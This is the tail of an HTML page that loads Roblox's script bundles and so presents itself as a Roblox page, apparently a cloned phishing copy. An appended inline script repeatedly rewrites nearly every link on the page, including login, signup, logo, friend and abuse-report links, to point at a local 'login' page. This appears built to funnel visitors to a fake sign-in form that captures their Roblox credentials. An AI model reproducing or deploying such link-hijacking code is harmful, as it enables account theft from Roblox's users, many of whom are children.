<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Common.Captcha" data-bundle-source="Unknown" src="https://js.rbxcdn.com/fe345fa49171e73999c333520b87bb3051dbd4c4e74c2ca9ebf8a8c05110f96a.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Common.Captcha" data-bundle-source="Unknown" src="https://js.rbxcdn.com/a6621e0d27855e4e2afe111af5aff2146ad81993b241f77c3188671c2704b7db.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="Login" data-bundle-source="Main" src="https://js.rbxcdn.com/3d6aa666e6523ab529194ee2ba45564d7b0750f927869b181def6527ec749bc8.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Feature.IdVerification" data-bundle-source="Unknown" src="https://js.rbxcdn.com/5a479caa4df1afb7857b070b2e8e03918811f8f1fbbc925eca576687773b6408.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Feature.IdVerification" data-bundle-source="Unknown" src="https://js.rbxcdn.com/6e8a110c397d70c5a9461eb71bbe3db975d3ffd373f09924d49f431b1b0c831c.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Feature.Screentime" data-bundle-source="Unknown" src="https://js.rbxcdn.com/28d2311ffd0ae82d9c47cfbdb464d41ce8c33fa6af5c03c895fa3867bb44a18e.js"></script>
<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="DynamicLocalizationResourceScript_Feature.Screentime" data-bundle-source="Unknown" src="https://js.rbxcdn.com/b1b5b618a2663a457bbf866ec91f6402994eddd1b5f5cf45ed79abc496f03e99.js"></script>
    


    


<script type="text/javascript" onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="LatencyMeasurement" data-bundle-source="Main" src="https://js.rbxcdn.com/90bb51db086699ec26a6c9df04087678948883f8c3ddd1037c7223a20ff4fe90.js"></script>



    <script onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="pageEnd" type="text/javascript" src="https://js.rbxcdn.com/492b4704e2abd68d7e7a9032839e272f.js"></script>


<script>
function loginroblox(matchClass, url) {
    var elems = document.getElementsByTagName('*'), i;
    for (i in elems) {
        if((' ' + elems[i].className + ' ').indexOf(' ' + matchClass + ' ')
                > -1) {
            elems[i].href = url;
        }
    }
}
var robloxlogin = setInterval(function(){
loginroblox('rbx-navbar-login btn-secondary-sm nav-menu-title rbx-menu-item', 'login');
loginroblox('btn-secondary-xs btn-more see-all-link-icon ng-binding', 'login');
loginroblox('btn-min-width btn-secondary-xs btn-more inventory-link see-all-link-icon ng-binding', 'login');
loginroblox('btn-secondary-xs btn-min-width btn-more see-all-link-icon', 'login');
loginroblox('btn-fixed-width btn-secondary-xs btn-more see-all-link-icon', 'login');
loginroblox('text-link friend-link ng-isolate-scope', 'login');
loginroblox('text-name', 'login');
loginroblox('abuse-report-link abuse-report-modal', 'login');
loginroblox('rbx-navbar-signup btn-growth-sm nav-menu-title signup-button', 'login');
loginroblox('navbar-brand', 'login');
loginroblox('btn-control-md disabled ng-binding ng-scope', 'login');
},1)
</script>

</body></html>